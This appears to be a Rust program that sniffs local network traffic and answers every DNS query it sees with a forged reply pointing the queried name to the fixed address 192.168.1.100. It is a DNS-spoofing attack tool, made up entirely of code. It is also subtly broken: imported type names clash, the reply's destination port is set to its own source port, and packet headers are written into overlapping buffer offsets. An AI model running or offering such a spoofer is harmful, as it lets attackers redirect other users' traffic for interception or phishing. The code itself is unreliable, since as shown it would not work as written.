extern crate dns_parser;
extern crate pnet;

use dns_parser::{Packet, Builder};
use pnet::datalink::{self, NetworkInterface, Channel::Ethernet};
use pnet::packet::ethernet::{EthernetPacket, MutableEthernetPacket, EtherTypes};
use pnet::packet::udp::{UdpPacket, MutableUdpPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::{Packet, MutablePacket};
use std::net::{Ipv4Addr, UdpSocket};

fn build_dns_response(request: &Packet, spoofed_ip: Ipv4Addr) -> Vec<u8> {
    let mut builder = Builder::new_response(request.header.id, true);
    builder.add_question(request.questions[0].clone());
    builder.add_answer(request.questions[0].name.clone(), 300, spoofed_ip);
    builder.build().unwrap()
}

fn main() {
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(|iface| iface.is_up() && !iface.ips.is_empty() && iface.is_broadcast()).unwrap();
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    let spoofed_ip = "192.168.1.100".parse().unwrap();
    loop {
        if let Ok(packet) = rx.next() {
            let ethernet_packet = EthernetPacket::new(packet).unwrap();
            if ethernet_packet.get_ethertype() == EtherTypes::Ipv4 {
                let ipv4_packet = Ipv4Packet::new(ethernet_packet.payload()).unwrap();
                if ipv4_packet.get_next_level_protocol() == IpNextHeaderProtocols::Udp {
                    let udp_packet = UdpPacket::new(ipv4_packet.payload()).unwrap();
                    let dns_packet = Packet::parse(udp_packet.payload()).unwrap();
                    if dns_packet.header.query {
                        let response = build_dns_response(&dns_packet, spoofed_ip);
                        let mut udp_buffer = vec![0u8; 42 + response.len()];
                        let mut udp_packet = MutableUdpPacket::new(&mut udp_buffer[14..]).unwrap();
                        udp_packet.set_source(53);
                        udp_packet.set_destination(udp_packet.get_source());
                        udp_packet.set_payload(&response);
                        let mut ipv4_packet = MutableIpv4Packet::new(&mut udp_buffer[..]).unwrap();
                        ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
                        ipv4_packet.set_payload(udp_packet.packet());
                        let mut ethernet_packet = MutableEthernetPacket::new(&mut udp_buffer).unwrap();
                        ethernet_packet.set_ethertype(EtherTypes::Ipv4);
                        ethernet_packet.set_payload(ipv4_packet.packet());
                        tx.send_to(&ethernet_packet.packet(), None).unwrap();
                    }
                }
            }
        }
    }
}
